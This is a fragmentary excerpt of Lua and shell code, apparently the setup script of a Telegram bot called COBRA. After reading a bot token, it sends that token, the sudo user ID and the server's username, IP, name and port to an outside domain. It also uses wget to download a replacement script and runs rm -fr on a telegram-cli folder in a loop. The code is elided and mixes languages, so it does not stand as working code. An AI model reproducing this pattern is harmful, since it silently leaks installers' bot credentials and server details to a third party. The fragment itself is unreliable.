...
local token = io.read()
if token ~= '' then
data,res = https.request("https://COBRA-api.ml/index.php?p=COBRA-DeV")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://COBRA-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://COBRA-api.ml/index.php?n=COBRA-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
...
rm -fr COBRA.lua
wget "https://raw.githubusercontent.com/COBRA-DeV/COBRA/main/COBRA.lua"
while(true) do
rm -fr ../.telegram-cli
